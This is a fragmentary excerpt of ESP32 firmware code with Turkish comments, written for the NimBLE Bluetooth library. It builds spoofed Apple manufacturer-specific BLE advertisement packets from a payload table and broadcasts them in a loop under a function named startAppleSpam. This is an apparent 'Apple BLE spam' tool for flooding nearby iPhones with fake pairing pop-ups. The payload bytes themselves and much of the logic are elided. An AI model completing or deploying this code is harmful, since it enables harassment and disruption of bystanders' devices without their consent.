...
// Küresel Değişkenler ve Android Model Listesi
uint8_t* data;
int deviceType = 0; 
...
// Optimize Edilmiş Apple BLE Paketleri
...
static NimBLEAdvertising *pAppleAdvertising = nullptr;
...
// NimBLE Kütüphanesine Uyarlanmış Reklam Oluşturma Fonksiyonu
void buildDynamicAdvertisement(NimBLEAdvertisementData &advData, int payloadIndex) {
    advData.setFlags(0x06); // General Discoverable & BR/EDR Not Supported

    uint8_t fullPayload[31];
    uint8_t payloadLen = apple_payloads[payloadIndex].length;
    
    fullPayload[0] = payloadLen + 3; 
    fullPayload[1] = 0xFF;           // Manufacturer Specific Data
    ...
    uint8_t txPowerField[] = {0x02, 0x0A, 0x0C}; 
...
void startAppleSpam(int payloadIndex) {
    ...
    while (apple_spam_running) {
        ...
        pAppleAdvertising->setScanResponseData(NimBLEAdvertisementData());
